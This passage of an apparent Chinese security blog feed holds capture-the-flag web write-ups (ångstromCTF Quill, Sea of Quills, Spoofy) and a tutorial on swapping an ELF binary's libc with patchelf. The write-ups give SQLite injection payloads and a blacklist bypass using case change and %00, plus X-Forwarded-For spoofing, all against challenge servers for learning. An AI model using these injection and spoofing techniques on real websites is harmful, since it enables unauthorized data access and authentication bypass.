class="line">end</span><br></pre></td></tr></table></figure><p>经过查阅发现是js写的sql查询，其中在’/quills’处没有对我们输入的cols参数进行过滤。</p><p>但做题时，还是技差一筹，百度了<code>sqlite3</code>是js操控Sql一种库，但忘了深入了解SQLite 跟MYSQL一样是一种数据库软件。(默认当sql来做然后原地卒…..)</p><p>于是经过查询查阅资料发现：</p><blockquote><p>SQLite数据库中有一个内置表，名为SQLITE_MASTER，此表中存储着当前数据库中所有表的相关信息，比如表的名称、用于创建此表的sql语句、索引、索引所属的表、创建索引的sql语句等。每一个 SQLite 数据库都有一个叫 SQLITE_MASTER 的表， 它定义数据库的模式。 </p><p>SQLITE_MASTER的表结构：</p><p>CREATE TABLE sqlite_master ( </p><p>type TEXT, </p><p>name TEXT, </p><p>tbl_name TEXT, </p><p>rootpage INTEGER, </p><p>sql TEXT );<br>原文链接：<a href="https://blog.csdn.net/qq_32572085/article/details/91407057" target="_blank" rel="noopener">https://blog.csdn.net/qq_32572085/article/details/91407057</a></p></blockquote><p>因此我们可以构造payload：</p><p><code>cols=sql from sqlite_master union all select desc</code></p><p>来看数据库中所有表的信息。</p><p><img src="image-20210411153853754.png" alt="image-20210411153853754"></p><p>发现<code>CREATE TABLE flagtable (flag varchar(30))</code> 于是查询flagtable。</p><p><img src="image-20210411154011337.png" alt="image-20210411154011337"></p><h3 id="Sea-of-Quills（复现）-1"><a href="#Sea-of-Quills（复现）-1" class="headerlink" title="Sea of Quills（复现）"></a>Sea of Quills（复现）</h3><p>这题较上一题多增加了限制：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="built_in">require</span> <span class="string">'sqlite3'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> :server, :puma</span><br><span class="line"><span class="keyword">set</span> :bind, "0.0.0.0"</span><br><span class="line"><span class="keyword">set</span> :port, 4567</span><br><span class="line"><span class="keyword">set</span> :environment, :production</span><br><span class="line"></span><br><span class="line"><span class="keyword">get</span> '/' do</span><br><span class="line">db = SQLite3::Database.new "quills.db"</span><br><span class="line">@row = db.execute( "select * from quills" )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">erb :index</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="keyword">get</span> '/quills' do</span><br><span class="line">erb :quills</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post '/quills' do</span><br><span class="line">db = SQLite3::Database.new "quills.db"</span><br><span class="line">cols = params[:cols]</span><br><span class="line">lim = params[:limit]</span><br><span class="line">off = params[:offset]</span><br><span class="line"></span><br><span class="line">blacklist = ["-", "/", ";", "'", "\"", "flag"]</span><br><span class="line"></span><br><span class="line">blacklist.each &#123; |word|</span><br><span class="line"><span class="keyword">if</span> cols.include? word</span><br><span class="line"><span class="keyword">return</span> <span class="string">"beep boop sqli detected!"</span></span><br><span class="line">end</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> cols.length &gt; <span class="number">24</span> || !<span class="regexp">/^[0-9]+$/</span>.match?(lim) || !<span class="regexp">/^[0-9]+$/</span>.match?(off)</span><br><span class="line"><span class="keyword">return</span> <span class="string">"bad, no quills for you!"</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">@row = db.execute(<span class="string">"select %s from quills limit %s offset %s"</span> % [cols, lim, off])</span><br><span class="line"></span><br><span class="line">p @row</span><br><span class="line"></span><br><span class="line">erb :specific</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>限制了<code>flag</code>字符的出现和cols的长度。</p><p>但经过参考lao的wp发现：</p><p>大小写可以绕过flag检测，%00有类似mysql中<code>#</code>的作用。</p><p>参考网址：<a href="https://ctftime.org/task/15344" target="_blank" rel="noopener">https://ctftime.org/task/15344</a></p><p>于是构造payload：<code>cols=* from Flagtable%00</code></p><p><img src="image-20210411160349101.png" alt="image-20210411160349101"></p><h3 id="Spoofy（复现）"><a href="#Spoofy（复现）" class="headerlink" title="Spoofy（复现）"></a>Spoofy（复现）</h3><p>题目源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> List</span><br><span class="line"></span><br><span class="line">FLAG: str = os.environ.get(<span class="string">"FLAG"</span>) <span class="keyword">or</span> <span class="string">"flag&#123;fake_flag&#125;"</span></span><br><span class="line"><span class="keyword">with</span> open(__file__, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    SOURCE: str = f.read()</span><br><span class="line"></span><br><span class="line">app: Flask = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">text_response</span><span class="params">(body: str, status: int = <span class="number">200</span>, **kwargs)</span> -&gt; Response:</span></span><br><span class="line">    <span class="keyword">return</span> Response(body, mimetype=<span class="string">"text/plain"</span>, status=status, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/source")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_source</span><span class="params">()</span> -&gt; Response:</span></span><br><span class="line">    <span class="keyword">return</span> text_response(SOURCE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_page</span><span class="params">()</span> -&gt; Response:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"X-Forwarded-For"</span> <span class="keyword">in</span> request.headers:</span><br><span class="line">        <span class="comment"># https://stackoverflow.com/q/18264304/</span></span><br><span class="line">        <span class="comment"># Some people say first ip in list, some people say last</span></span><br><span class="line">        <span class="comment"># I don't know who to believe</span></span><br><span class="line">        <span class="comment"># So just believe both</span></span><br><span class="line">        ips: List[str] = request.headers[<span class="string">"X-Forwarded-For"</span>].split(<span class="string">", "</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ips:</span><br><span class="line">            <span class="keyword">return</span> text_response(<span class="string">"How is it even possible to have 0 IPs???"</span>, <span class="number">400</span>)</span><br><span class="line">        <span class="keyword">if</span> ips[<span class="number">0</span>] != ips[<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">return</span> text_response(</span><br><span class="line">                <span class="string">"First and last IPs disagree so I'm just going to not serve this request."</span>,</span><br><span class="line">                <span class="number">400</span>,</span><br><span class="line">            )</span><br><span class="line">        ip: str = ips[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> ip != <span class="string">"1.3.3.7"</span>:</span><br><span class="line">            <span class="keyword">return</span> text_response(<span class="string">"I don't trust you &gt;:("</span>, <span class="number">401</span>)</span><br><span class="line">        <span class="keyword">return</span> text_response(<span class="string">"Hello 1337 haxx0r, here's the flag! "</span> + FLAG)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> text_response(<span class="string">"Please run the server through a proxy."</span>, <span class="number">400</span>)</span><br></pre></td></tr></table></figure><p>根据审阅代码及提示,发现是X-Forwarded-For伪造.但是题目对”X-Forwarded-For”每一个参数都进行了处理我们单纯改会抱错.来自<a href="https://stackoverflow.com/questions/18264304/get-clients-real-ip-address-on-heroku所提到,我们手改X-Forwarded-For头包里依然会加上我们的正式地址" target="_blank" rel="noopener">https://stackoverflow.com/questions/18264304/get-clients-real-ip-address-on-heroku所提到,我们手改X-Forwarded-For头包里依然会加上我们的正式地址</a>.</p><p><img src="image-20210412154952876.png" alt="image-20210412154952876"></p><p>因此我们可以利用不同中间件处理http策略不同的特性.构造两个X-Forwarded-For:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:1.3.3.7</span><br><span class="line">X-Forwarded-For: 1.1.1.1, 1.3.3.7</span><br></pre></td></tr></table></figure><p>从而绕过得到flag。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记着自己去年刚接触国外的ctf比赛入门时,第一个接触的国外ctf比赛就是ångstromCTF。但当时我web方向做了很多，但今年却一道题都没有做出来（虽然其他方向做了写）。但也应该反省下《关于年过后我发现一年前的我比现在NB这件事》了。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="web" scheme="lexsd6.github.io/tags/web/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>修改ELF文件libc为指定版本</title>
    <link href="lexsd6.github.io/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/"/>
    <id>lexsd6.github.io/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/</id>
    <published>2021-03-25T14:49:04.809Z</published>
    <updated>2021-03-26T05:55:10.946Z</updated>
    
    <content type="html"><![CDATA[<p>最近在学习堆时,常常遇到本地libc与题目libc不匹配导致一些骚套路无法在本地调试和利用.要想gdb,不仅得要安个符合版本的虚拟机或起一个docker还有部署一边pwn环境,这一点很烦(#`Д´).于是想找下有没有更方便的方法.  于是找到了patchelf更换libc的方法。</p><a id="more"></a><h3 id="glibc-all-in-one与patchelf安装"><a href="#glibc-all-in-one与patchelf安装" class="headerlink" title="glibc-all-in-one与patchelf安装"></a>glibc-all-in-one与patchelf安装</h3><p>glibc-all-in-one，正如其名是一个多版本libc的下载安装管理工具，主要支持2.19，2.23-2.29版本的libc和i686, amd64的架构。这是github一个开源项目因此我们git它既可。</p><p>安装命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one.git </span><br><span class="line">cd glibc-all-in-one </span><br><span class="line">chmod a+x build download extract</span><br></pre></td></tr></table></figure><p>patchelf在ubuntu直接<code>apt install patchelf</code>即可。</p><h3 id="对应libc编译"><a href="#对应libc编译" class="headerlink" title="对应libc编译"></a>对应libc编译</h3><p>我们可以通过在glibc-all-in-one目录下执行<code>./build</code>即可获对应版本的libc和ld.so</p><p>例如：<code>./build 2.29 i686</code></p><p>下载安装编译 32位的2.29 版本libc。</p><h3 id="patchelf更改程序libc"><a href="#patchelf更改程序libc" class="headerlink" title="patchelf更改程序libc"></a>patchelf更改程序libc</h3><p>执行<code>patchelf --set-interpreter ld.so  elf</code>    来修改文件ld.so</p><p>执行<code>patchelf --replace-needed   old_libc.so  new_libc.so elf</code>来修改文件libc.so</p><p>以更改gundam文件为例,例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo patchelf --set-interpreter /glibc/2.26/amd64/lib/ld-2.26.so --set-rpath /glibc/2.26/amd64/lib/ ~/Desktop/pwn/buu/gumad/gundam</span><br><span class="line"></span><br><span class="line">patchelf --replace-needed /glibc/2.23/amd64/lib/libc-2.23.so /glibc/2.26/amd64/lib/libc-2.26.so ~/Desktop/pwn/buu/gumad/gundam</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.nopnoping.xyz/2020/04/17/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/" target="_blank" rel="noopener">https://www.nopnoping.xyz/2020/04/17/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/</a></p><p><a href="https://blog.csdn.net/github_36788573/article/details/103291343" target="_blank" rel="noopener">https://blog.csdn.net/github_36788573/article/details/103291343</a></p><p><a href="https://blog.csdn.net/qq_41560595/article/details/114597342" target="_blank" rel="noopener">https://blog.csdn.net/qq_41560595/article/details/114597342</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在学习堆时,常常遇到本地libc与题目libc不匹配导致一些骚套路无法在本地调试和利用.要想gdb,不仅得要安个符合版本的虚拟机或起一个docker还有部署一边pwn环境,这一点很烦(#`Д´).于是想找下有没有更方便的方法.  于是找到了patchelf更换libc的方法。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="lexsd6.github.io/categories/Linux/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
    <category term="Linux" scheme="lexsd6.github.io/tags/Linux/"/>
    
    <category term="libc" scheme="lexsd6.github.io/tags/libc/"/>
    
  </entry>
  
</feed>
